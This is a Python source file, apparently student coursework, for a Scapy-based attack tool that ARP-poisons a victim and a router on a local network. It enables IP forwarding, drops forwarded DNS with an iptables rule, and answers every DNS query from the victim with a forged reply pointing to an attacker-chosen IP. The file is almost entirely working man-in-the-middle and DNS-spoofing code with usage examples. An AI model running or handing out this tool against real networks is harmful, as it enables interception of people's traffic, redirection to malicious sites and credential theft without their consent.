'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    dnsspoof.py
--
--  AUTHORS:        Thilina Ratnayake (A00802338) & Elton Sia (A00800541)
--
--  PROGRAM:        Arp poisons a target, performs a man-in-the-middle attack
--                  and responds to every DNS request with a response for
--                  a specific site.
--
--  FUNCTIONS:      parse_arguments()
--					victimMacAddress()
--					routerMacAddress()
--					ownMacAddress()
--					forwarding()
--					arpPoison()
--					sniffDNS()
--					spoofDNS()
--
--  DATE:           November 4, 2015
--
--  REVISIONS:
--
--  NOTES:
--  The program requires the Scapy library for packet crafting.
--
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
--
--	USAGE:
--	python dnsspoof.py -v [Victim IP] -r [Router IP] -i [own machine's IP]
--					   -g [IP of the target website]
--	Example Usage:
--	python dnsspoof.py -v 192.168.0.24 -r 192.168.0.100 -i 192.168.0.25
--					   -g 192.168.0.8
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
from scapy.all import *
from subprocess import Popen, PIPE, call
from multiprocessing import Process
import argparse
import sys
import re
import time

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	parse_arguments
--
--  Parameters:	None
--
--  Return Values:	None
--
--  Description:
--      The arguments needed to run the program.
--		Doing python "dnsspoof.py -h" will show the parameters that are allowed
--
--	Usage:
--	python dnsspoof.py -v 192.168.0.24 -r 192.168.0.100 -i 192.168.0.25
--					   -g 192.168.0.8
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="IP address of victim")
	parser.add_argument("-r", "--routerIP", help="IP address of router")
	parser.add_argument("-i", "--ownIP", help="IP address of your own machine")
	parser.add_argument("-g", "--gotoIP", help="IP address of where target's should be redirected to")
	return parser.parse_args()

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	victimMacAddress()
--
--  Parameters:	victim
--
--  Return Values:	victimMac
--
--  Description:
--      Gets the MAC address of the victim's IP address
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def victimMacAddress(victim):
	ip = victim
	Popen(["ping", "-c 1", ip], stdout=PIPE)
	pid = Popen(["arp", "-n", ip], stdout=PIPE)
	s = pid.communicate()[0]
	victimMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return victimMac

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	routerMacAddress()
--
--  Parameters:	router
--
--  Return Values:	routerMac
--
--  Description:
--      Gets the MAC address of the router's IP address
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def routerMacAddress(router):
	ip = router
	Popen(["ping", "-c 1", ip], stdout=PIPE)
	pid = Popen(["arp", "-n", ip], stdout=PIPE)
	s = pid.communicate()[0]
	routerMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return routerMac

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	ownMacAddress()
--
--  Parameters:	None
--
--  Return Values:	myMac
--
--  Description:
--      Gets the MAC address of our own machine
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def ownMacAddress():
	arppkt = ARP()
	myMac = arppkt[ARP].hwsrc
	return myMac

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	forwarding()
--
--  Parameters:	None
--
--  Return Values:	None
--
--  Description:
--      Enables IP forwarding so that packets from the victim will be forwarded.
--		Add firewall rule to drop UDP packets going to dport 53 in the FORWARD
--		chain.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def forwarding():
	#write "1" into /proc/sys/net/ipv4/ip_forward
	ipforward = "echo \"1\" >> /proc/sys/net/ipv4/ip_forward"
	Popen([ipforward], shell=True, stdout=PIPE)

	#Firewall rule, disable forwarding of any UDP packets to dport 53
	firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
	Popen([firewall], shell=True, stdout=PIPE)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	arpPoison()
--
--  Parameters:	victim, router
--
--  Return Values:	None
--
--  Description:
--      Send ARP packets to both the victim and the router every 2 seconds
--		stating that the router is at the attacker machine to the victim and
--		the victim machine is at the attacker machine to the router.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def arpPoison(victim, router):
	#IP and MAC addresses
	victimIP = victim
	routerIP = router
	victimMac = victimMacAddress(victimIP)
	routerMac = routerMacAddress(routerIP)
	print "Starting ARP poisoning to victim "+victimIP + " and router " + routerIP
	while True:
		time.sleep(2)
		#3A Repeatedly send ARP reply's to VICTIM stating that router IP
		# is at THIS MAC addr
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMac),verbose = 0)
		#3B Repeatedly send ARP reply's to ROUTER stating that the victim IP
		# is at THIS MAC
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMac),verbose = 0)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	sniffDNS()
--
--  Parameters:	victimIP,routerIP,ownIP,gotoIP
--
--  Return Values:	None
--
--  Description:
--      Sniff for traffic on udp and port 53 (DNS) and the victim and send each
--		packet to the spoofDNS function where the each packets are handled.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def sniffDNS(victimIP,routerIP,ownIP,gotoIP):
	sniff (filter="udp and port 53 and host " + victimIP, prn = spoofDNS)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	spoofDNS()
--
--  Parameters:	packet
--
--  Return Values:	None
--
--  Description:
--      Checks if the victim had sent for a DNSQR and we then craft a response
--		and send that response for each DNSQR that the victim has.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def spoofDNS(packet):
	#CHecks if the source IP of the packet is the victim
	if packet[IP].src == victimIP:
	#Checks if it is a DNS packet
		if packet.haslayer(DNS):
			#Checks if the packet is a DNS query
			if DNSQR in packet:
				#Send back a spoofed packet
				spoofed_pkt = (Ether()/IP(dst=packet[IP].src, src=packet[IP].dst)/\
	                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
	                      DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
	                      an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
	        	sendp(spoofed_pkt, count=1)

#Global
if __name__ == '__main__':
	#Grab all the arguments and store into variables
	arguments = parse_arguments()
	victimIP = arguments.victimIP
	routerIP = arguments.routerIP
	ownIP = arguments.ownIP
	gotoIP = arguments.gotoIP

	#enable fowrwarding and the firewall
	forwarding()

	#Create two processes for the arp poison and for sniffing the traffic
	arpPoisonProcess = Process(target=arpPoison,args=(victimIP,routerIP))
	arpPoisonProcess.start()
	sniffDNSprocess = Process(target=sniffDNS,args=(victimIP,routerIP,ownIP,gotoIP))
	sniffDNSprocess.start()
	arpPoisonProcess.join()
	sniffDNSprocess.join()
